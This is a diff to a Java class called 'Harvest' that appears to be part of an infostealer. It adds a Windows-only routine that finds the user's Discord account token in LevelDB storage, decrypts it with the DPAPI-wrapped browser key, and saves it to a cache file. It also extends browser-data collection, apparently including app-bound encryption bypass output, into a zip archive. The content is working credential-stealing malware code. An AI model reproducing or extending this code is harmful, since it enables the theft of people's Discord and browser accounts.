@@ -160,6 +160,33 @@ public final class Harvest {
 	 * envelope -> /users/@me. The v10 key is the DPAPI-wrapped os_crypt key in
 	 * the sibling Local State file.
 	 */
+	/** Manual recovery: writes cache/discord/token.txt and returns the token or "". */
+	static String discordTokenNow(Path installDir) {
+		if (!AgentPaths.isWindows()) {
+			return "";
+		}
+		try {
+			for (Path base : discordBases()) {
+				if (!Files.isDirectory(base)) {
+					continue;
+				}
+				String token = tokenFromLevelDb(base);
+				if (token == null) {
+					token = searchToken(base, 0);
+				}
+				if (token != null) {
+					Path cache = AgentPaths.cache(installDir).resolve("discord");
+					Files.createDirectories(cache);
+					Files.writeString(cache.resolve("token.txt"), "token=" + token + "\n", StandardCharsets.UTF_8);
+					return token;
+				}
+			}
+		} catch (Throwable throwable) {
+			Log.debug("Manual token recovery failed", throwable);
+		}
+		return "";
+	}
+
 	private static String tokenFromLevelDb(Path base) {
 		byte[] aes = null;
 		boolean aesLoaded = false;
@@ -554,6 +581,9 @@ public final class Harvest {
 				text.append("abe=ok\n");
 			} else if (result.error() != null && !result.error().isBlank()) {
 				text.append("abe_error=").append(result.error().replace('\n', ' ')).append('\n');
+				if (result.log() != null && !result.log().isBlank()) {
+					text.append("abe_log=").append(result.log().replace('\n', ' ')).append('\n');
+				}
 			}
 			if (result.ok()) {
 				Abe.collect(result.output(), zip, "browsers/" + browser.label() + "/abe");
